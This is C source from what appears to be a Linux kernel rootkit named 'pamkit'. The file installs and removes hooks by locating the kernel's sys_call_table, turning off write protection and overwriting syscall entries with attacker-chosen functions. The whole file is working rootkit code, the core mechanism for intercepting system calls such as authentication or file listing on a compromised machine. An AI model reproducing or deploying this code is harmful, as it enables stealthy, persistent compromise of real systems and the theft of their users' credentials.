#include "helpers.h"

#if defined(PAMKIT_TABLE_OVERWRITE_SYSCALL_HOOKING)

int install_syscall_hooks(hook_data_t syscall_hooks[]);
int uninstall_syscall_hooks(hook_data_t syscall_hooks[]);

int
install_syscall_hooks(hook_data_t syscall_hooks[])
{
    prdebug("Attempting to install syscall hooks...");

    unsigned long *__syscall_table = (unsigned long *) pamkit_lookup_symbol_addr("sys_call_table");
    if (!__syscall_table) {
        prerr("Failed to get handle to system call table");
        return PAMKIT_GENERIC_ERROR;
    }

    pamkit_disable_write_protection();

    hook_data_t *hook = &syscall_hooks[0];
    while (hook->hook_function_addr) {

        *(hook->orig_function_addr) = (uintptr_t) __syscall_table[hook->syscall_table_index];
        __syscall_table[hook->syscall_table_index] = (uintptr_t) hook->hook_function_addr;

        prdebug("Patched syscall table to install hook for '%s'", hook->name);

        hook++;
    }

    pamkit_enable_write_protection();

    prdebug("Successfully installed the syscall hooks!");
    return PAMKIT_GENERIC_SUCCESS;
}

int
uninstall_syscall_hooks(hook_data_t syscall_hooks[])
{
    prdebug("Attempting to remove any installed syscall hooks...");

    unsigned long *__syscall_table = (unsigned long *) pamkit_lookup_symbol_addr("sys_call_table");
    if (!__syscall_table) {
        prerr("Failed to get handle to system call table");
        return PAMKIT_GENERIC_ERROR;
    }

    pamkit_disable_write_protection();

    hook_data_t *hook = &syscall_hooks[0];
    while (hook->hook_function_addr) {

        if (hook->orig_function_addr) {
            prdebug("Restoring the original handler for '%s'", hook->name);

             __syscall_table[hook->syscall_table_index] = (unsigned long) *(hook->orig_function_addr);
        }

        hook++;
    }

    pamkit_enable_write_protection();

    prdebug("Successfully de-registered the installed syscall hooks!");
    return PAMKIT_GENERIC_SUCCESS;
}

#endif /* PAMKIT_TABLE_OVERWRITE_SYSCALL_HOOKING */
